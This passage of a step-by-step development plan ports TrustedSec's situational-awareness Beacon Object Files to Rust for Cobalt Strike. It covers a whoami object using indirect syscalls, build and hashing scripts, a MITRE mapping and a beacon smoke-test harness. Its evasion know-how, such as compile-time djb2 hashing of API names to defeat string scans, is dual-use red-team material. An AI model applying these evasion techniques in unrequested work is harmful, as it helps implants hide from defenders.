description = "Token info dump — by Dani. Original C: TrustedSec/cs-situational-awareness-bof (whoami.c)"

[dependencies]
rustbof.workspace = true
common = { path = "../../common" }
windows-sys = { workspace = true, features = ["Win32_Security"] }
obfstr.workspace = true

[lib]
crate-type = ["staticlib"]
name = "whoami"
```

- [ ] **Step 3: Write `situational-awareness/whoami/src/lib.rs`**

```rust
// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening — by Dani
// Original C: TrustedSec/cs-situational-awareness-bof — whoami.c
//
#![no_std]
#![cfg_attr(not(test), no_main)]
extern crate alloc;

use rustbof::{println, eprintln};
use common::mitre::Technique;
use common::token::{open_current_process_token, TOKEN_QUERY};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1033", name: "System Owner/User Discovery", tactic: "Discovery" },
    Technique { id: "T1134", name: "Access Token Manipulation",   tactic: "Privilege Escalation" },
];

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    let token = unsafe { open_current_process_token(TOKEN_QUERY) }
        .map_err(|_| "NtOpenProcessToken failed")?;
    println!("TOKEN_HANDLE: 0x{:x}", token);
    // Phase 1 minimal: confirm we can open the token. Full SID/group enumeration
    // is intentionally deferred to Phase 2 whoami refinement — the canary's
    // job here is to PROVE the indirect-syscall path works end-to-end.
    println!("STATUS:       indirect syscall path validated");
    Ok(())
}
```

- [ ] **Step 4: Build**

Run: `bash scripts/build_one.sh whoami`
Expected: `dist/whoami.x64.o` + `dist/whoami.x86.o`.

- [ ] **Step 5: Verify**

Run: `bash scripts/verify_coff.sh`
Expected: `✓ 6 COFF artifacts verified`. Crucially, `strings dist/whoami.x64.o | grep -i ntopen` returns **zero** — `"NtOpenProcessToken"` is consumed by `djb2` at compile-time.

- [ ] **Step 6: Commit**

```bash
git add common/src/syscalls.rs situational-awareness/whoami/
git commit -m "feat(whoami): canary 3 — full HalosGate + indirect syscall path (Dani)"
```

---

## Task 19: scripts/build_all.sh + scripts/gen_manifest.py

**Files:**
- Create: `scripts/build_all.sh`
- Create: `scripts/gen_manifest.py`

- [ ] **Step 1: Write `scripts/build_all.sh`**

```bash
#!/usr/bin/env bash
# scripts/build_all.sh — build every Phase-1+ BOF crate.
# Author: Dani <daniagungg@gmail.com>
set -euo pipefail

mkdir -p dist

mapfile -t CRATES < <(cargo metadata --no-deps --format-version 1 \
    | jq -r '.packages[] | select(.name != "common") | .name' \
    | sort -u)

if [[ "${#CRATES[@]}" -eq 0 ]]; then
    echo "ERROR: no BOF crates found in workspace (only 'common' present)" >&2
    exit 1
fi

echo "==> Building ${#CRATES[@]} crates"
for crate in "${CRATES[@]}"; do
    bash scripts/build_one.sh "$crate"
done

echo "==> Verifying"
bash scripts/verify_coff.sh

echo "==> Generating manifest"
python3 scripts/gen_manifest.py > dist/manifest.json
cat dist/manifest.json

echo "==> ✓ build_all complete"
```

- [ ] **Step 2: Write `scripts/gen_manifest.py`**

```python
#!/usr/bin/env python3
"""scripts/gen_manifest.py — emit dist/manifest.json with SHA-256 per .o.

by Dani <daniagungg@gmail.com>
"""
import hashlib
import json
import sys
from pathlib import Path

DIST = Path(__file__).resolve().parents[1] / "dist"

def sha256(p: Path) -> str:
    h = hashlib.sha256()
    with p.open("rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()

def main() -> int:
    entries = []
    for p in sorted(DIST.glob("*.o")):
        entries.append({
            "name": p.stem,           # e.g. "whoami.x64"
            "file": p.name,
            "size": p.stat().st_size,
            "sha256": sha256(p),
        })
    json.dump({
        "project": "DEF-Situational-Awareness-BOF",
        "credit": "by Dani <daniagungg@gmail.com>",
        "artifacts": entries,
    }, sys.stdout, indent=2)
    print()
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
```

- [ ] **Step 3: Mark executable, run end-to-end**

```bash
chmod +x scripts/build_all.sh scripts/gen_manifest.py
bash scripts/build_all.sh
```

Expected:
- 3 crates × 2 archs = 6 `.o` files in `dist/`
- `dist/manifest.json` with `"artifacts": [ ... 6 entries ... ]`
- `verify_coff.sh` reports `✓ 6 COFF artifacts verified`

- [ ] **Step 4: Commit**

```bash
git add scripts/build_all.sh scripts/gen_manifest.py
git commit -m "build: build_all.sh + gen_manifest.py (Dani)"
```

---

## Task 20: docs/mitre-mapping.md + scripts/smoke_test.sh + final commit

**Files:**
- Create: `docs/mitre-mapping.md`
- Create: `scripts/smoke_test.sh`

- [ ] **Step 1: Write `docs/mitre-mapping.md`** (seeded with canaries; phases 2-6 extend it)

```markdown
# MITRE ATT&CK Mapping

Every BOF in the suite prints these techniques at runtime via `common::mitre::print_banner`.
This file is the master table — keep it in sync with each BOF's `TECHNIQUES` constant.

| BOF | Techniques | Tactic |
|---|---|---|
| uptime   | T1082 | Discovery |
| hostname | T1082 | Discovery |
| whoami   | T1033, T1134 | Discovery / Privilege Escalation |

_Extended in Phase 2-6. Maintainer: Dani._
```

- [ ] **Step 2: Write `scripts/smoke_test.sh`**

```bash
#!/usr/bin/env bash
# scripts/smoke_test.sh — manual Win VM smoke harness.
# Operator runs this with a Cobalt Strike teamserver reachable.
# Author: Dani <daniagungg@gmail.com>
set -euo pipefail

echo "This is a manual harness. Steps:"
echo "  1. Spawn beacon on Win10/11 test VM."
echo "  2. From CS console: inline-execute dist/uptime.x64.o"
echo "  3. Expect MITRE banner + 'UPTIME: <d>d <h>h ...' line."
echo "  4. Repeat for hostname.x64.o and whoami.x64.o."
echo "  5. For each, confirm: no beacon crash, banner present, expected output."
echo "  6. Record outcome in docs/smoke-runs/$(date +%Y-%m-%d).md"

ls -la dist/*.{x64,x86}.o
```

- [ ] **Step 3: Mark executable**

```bash
chmod +x scripts/smoke_test.sh
```

- [ ] **Step 4: Commit**

```bash
git add docs/mitre-mapping.md scripts/smoke_test.sh
git commit -m "docs: MITRE mapping + smoke_test.sh harness (Dani)"
```

- [ ] **Step 5: Tag Phase 1 complete**

```bash
git tag -a v0.1.0-phase1 -m "Phase 1: Foundation + Canary — by Dani

Workspace, common OPSEC primitives crate, build pipeline, and three canary
BOFs (uptime, hostname, whoami) validated end-to-end on a target
Windows VM via inline-execute.

Phases 2-6 extend the BOF roster following the established pattern."
```

- [ ] **Step 6: Verify Phase 1 acceptance**

Run all of:
```bash
cargo make test          # host unit tests pass
cargo make clippy        # no clippy warnings
cargo make build-all     # all 6 artifacts build
cargo make verify        # leak-check passes
```

All four commands must exit 0. If any fail, fix before declaring Phase 1 done.

---

## Phase 1 acceptance summary

- `cargo make test` — `common` host tests all green
- `cargo make clippy` — workspace lint clean (no `unwrap_used` / `panic` violations)
- `cargo make build-all` — `dist/` contains 6 `.o` files + `manifest.json`
- `cargo make verify` — no leaked sensitive strings in any artifact
- Manual: operator loads each canary in Cobalt Strike on a test VM; each prints the MITRE banner and expected output; no beacon crash

Once these pass, Phase 2 (bulk SA port — 25 BOFs) follows the same template established in Tasks 15/17/18: clone the canary structure, swap in the appropriate `dfr_fn!` or `nt_syscall!` chain, add MITRE techniques, build, verify, commit.

---

**End of Phase 1 plan.**
